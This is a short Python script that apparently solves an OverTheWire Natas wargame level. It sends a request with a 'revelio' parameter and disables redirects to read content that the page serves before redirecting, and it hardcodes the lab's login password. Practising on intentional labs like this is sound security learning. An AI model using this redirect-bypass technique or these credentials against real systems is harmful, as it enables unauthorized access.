#!/bin/python3
import requests
url = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
r = requests.get(url,auth=('natas22','91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'),allow_redirects=False)
print(r.text)
